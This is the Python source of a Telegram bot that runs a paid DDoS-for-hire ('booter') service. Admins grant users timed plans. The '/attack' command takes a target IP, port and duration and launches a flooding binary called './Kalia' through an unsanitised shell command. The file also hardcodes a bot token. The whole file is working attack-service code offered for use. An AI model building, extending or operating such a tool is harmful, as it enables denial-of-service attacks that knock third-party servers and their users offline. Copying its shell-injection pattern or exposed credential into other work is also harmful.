import os
import telebot
import json
import logging
import time
import random
import asyncio
from datetime import datetime, timedelta
from threading import Thread
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# ============ CONFIG ============
TOKEN = '7453848212:AAFimx4YnpejwLseQQL4OmrlEMxiR5IBVFQ'  # replace with your token
FORWARD_CHANNEL_ID = -1002903739695
CHANNEL_ID = -1002903739695
error_channel_id = -1002903739695
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

DATA_FILE = "users.json"
# ================================

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
loop = asyncio.get_event_loop()

# ---------- JSON STORAGE ----------
def load_users():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    return {}

def save_users(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

users_collection = load_users()
# ----------------------------------


# ---------- PROXY UPDATE ----------
def update_proxy():
    proxy_list = [
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")
# ----------------------------------


# ---------- ADMIN CHECK ----------
def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False
# ----------------------------------


# ---------- APPROVE / DISAPPROVE ----------
@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*🚫 Access Denied!*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*⚠️ Format:*\n/approve <user_id> <plan> <days>\n/disapprove <user_id>", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = str(cmd_parts[1])
    target_username = message.reply_to_message.from_user.username if message.reply_to_message else None
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    global users_collection

    if action == '/approve':
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else ""
        users_collection[target_user_id] = {
            "user_id": int(target_user_id),
            "username": target_username,
            "plan": plan,
            "valid_until": valid_until,
            "access_count": 0
        }
        save_users(users_collection)
        msg_text = f"*✅ Approved {target_user_id} for plan {plan} ({days} days)*"
    else:
        if target_user_id in users_collection:
            users_collection[target_user_id]["plan"] = 0
            users_collection[target_user_id]["valid_until"] = ""
            save_users(users_collection)
        msg_text = f"*❌ Disapproved {target_user_id}*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
# --------------------------------------------


# ---------- ATTACK HANDLING ----------
bot.attack_in_progress = False
bot.attack_duration = 0
bot.attack_start_time = 0

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./Kalia {target_ip} {target_port} {duration} 877")
    await process.communicate()
    bot.attack_in_progress = False

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id

    try:
        user_data = users_collection.get(user_id)
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied! Contact @KaliaYtOwner*", parse_mode='Markdown')
            return

        if bot.attack_in_progress:
            bot.send_message(chat_id, "*⚠️ Bot is busy. Use /when to check remaining time.*", parse_mode='Markdown')
            return

        bot.send_message(chat_id, "*💣 Send target: ip port duration*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)

    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❗ Wrong format. Use: ip port duration*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*", parse_mode='Markdown')
            return
        if duration >= 600:
            bot.send_message(message.chat.id, "*⏳ Max duration 599 sec*", parse_mode='Markdown')
            return  

        bot.attack_in_progress = True
        bot.attack_duration = duration
        bot.attack_start_time = time.time()

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*🚀 Attack started on {target_ip}:{target_port} for {duration}s*", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
# ----------------------------------


# ---------- STATUS ----------
@bot.message_handler(commands=['when'])
def when_command(message):
    if bot.attack_in_progress:
        elapsed_time = time.time() - bot.attack_start_time
        remaining_time = bot.attack_duration - elapsed_time
        if remaining_time > 0:
            bot.send_message(message.chat.id, f"*⏳ Remaining: {int(remaining_time)} sec*", parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "*✅ Attack finished*", parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, "*❌ No attack in progress*", parse_mode='Markdown')
# ----------------------------------


# ---------- USER INFO ----------
@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    user_id = str(message.from_user.id)
    user_data = users_collection.get(user_id)

    if not user_data:
        response = "*❌ No info found. Contact @KaliaYtOwner*"
    elif user_data.get('plan', 0) == 0:
        response = "*🔒 Not approved yet. Contact @KaliaYtOwner*"
    else:
        username = message.from_user.username or "Unknown"
        plan = user_data.get('plan', 'N/A')
        valid_until = user_data.get('valid_until', 'N/A')
        current_time = datetime.now().isoformat()
        response = (f"*👤 User: @{username}*\n"
                    f"*💸 Plan: {plan}*\n"
                    f"*⏳ Valid Until: {valid_until}*\n"
                    f"*⏰ Current Time: {current_time}*")

    bot.send_message(message.chat.id, response, parse_mode='Markdown')
# ----------------------------------


# ---------- HELP & RULES ----------
@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules_text = (
        "*📜 Rules:*\n"
        "1. No spamming attacks\n"
        "2. Max 599 sec per attack\n"
        "3. Respect others\n"
        "4. Don’t misuse the bot"
    )
    bot.send_message(message.chat.id, rules_text, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = ("*🌟 Commands:*\n"
                 "/attack - Launch attack\n"
                 "/myinfo - Check account info\n"
                 "/when - Remaining attack time\n"
                 "/rules - Bot rules\n"
                 "/owner - Owner contact")
    bot.send_message(message.chat.id, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['owner'])
def owner_command(message):
    response = "*👤 Owner: @KaliaYtOwner*"
    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id,
        "*🌍 Welcome!* Use /help to see commands.", parse_mode='Markdown')
# ----------------------------------


# ---------- ASYNCIO THREAD ----------
async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())
# ----------------------------------


if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Bot started...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")
        time.sleep(REQUEST_INTERVAL)